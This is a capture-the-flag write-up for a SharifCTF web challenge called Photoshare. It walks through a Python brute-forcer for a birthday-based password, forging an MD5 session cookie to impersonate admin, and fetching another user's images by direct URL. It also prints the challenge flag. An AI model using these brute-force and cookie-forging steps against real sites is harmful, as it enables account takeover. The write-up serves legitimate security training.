<h1>Photoshare (250 PTS)</h1>

<h3>Description</h3>

<blockquote>
  <p>Photoshare is an internet based photo sharing service. Login to this website as admin.</p>
  
  <p>web: ctf.sharif.edu:8084</p>
  
  <p>username: jack</p>
  
  <p>password: Year and month of Jack's birthday.</p>
</blockquote>

<blockquote>
  <p>Hint:No need for XSS or bypassing the uploader.</p>
</blockquote>

<p>Flag: <code>SharifCTF{kmvfwmj6sea7get9wggu249ehjc8hmdd}</code></p>

<h3>Solution</h3>

<p><img src='images/welcome.png' /></p>

<p>Website welcomes us with a login form. Username is known from the description (<code>jack</code>), password mask is <code>YYYYMM</code> (also from the description), secret question is pretty simple. So we need to investigate a html code and write a bruteforcer.</p>

<p><img src='images/html.png' /></p>

<p>I marked fields which should be extracted. I've used Python for writing it.</p>

<p>```python
import re
import requests</p>

<p>def get<em>hidden(url):
    response = requests.get(url)
    html = response.text
    question = re.search('name="SecQuestion" placeholder="(.*?)"', html)[1]
    answer = eval(question.split('=')[0].replace('x', '*'))
    field = re.search('name="field" value="(\w+)"', html)[1]
    token = re.search('name="</em>token" value="(\w+)">', html)[1]
    return response.cookies, answer, field, token</p>

<p>def get_passwords():
    for year in range(1900, 2019):
        for month in range(1, 13):
            yield '%04d%02d' % (year, month)
```</p>

<p>Full code you can see in <a href="brute.py">brute.py</a>. Run it and... yeah!
<code>
Found password for jack: 195408
</code></p>

<p>Now we can login as jack.</p>

<p><img src='images/home.png' /></p>

<p><img src='images/upload.png' /></p>

<p>Website has two pages: we can upload a photo with id from 1 to 6 and show it on the showcase.
Look at the urls.</p>

<p><img src='images/images.png' /></p>

<p>It seems that we can insert any username instead of <code>jack</code>, but it causes 403.</p>

<p><img src='images/denied.png' /></p>

<p>Interesting, but we're following Hint and <code>not bypassing the uploader</code>. Look at the cookie called <code>session_id</code> instead! Yes, it's just an md5 hash which can easily be cracked.</p>

<p><code>
session_id=a6da08ce385c95026045150daf37e2f8 = md5(jack34)
</code></p>

<p>After some experiments I decided that we can write here hashes of jacks from <code>jack1</code> to <code>jack60</code>, but it isn't important. Authors asks us to login as <code>admin</code>, so let's do it! Try to set <code>md5(admin34)</code> and reload the page.</p>

<p>```python</p>

<blockquote>
  <blockquote>
    <blockquote>
      <p>md5(b'admin34').hexdigest()
      '06d6d78ec1dd8f97a0475ecfd034c55c'</p>
      
      <p>```</p>
    </blockquote>
  </blockquote>
</blockquote>

<p><img src='images/admin.png' /></p>

<p>Oops! Security check. But what if we open images directly from urls? For example image with <code>id=3</code>:</p>

<p><code>
http://ctf.sharif.edu:8084/GetPicture/admin/3
</code></p>

<p><img src='images/teacher.png' /></p>

<p>Yeah, got it! His name is <code>Mr. Tashakkor</code>. Now we can use it for entering the website.</p>

<p><img src='images/final.png' /></p>
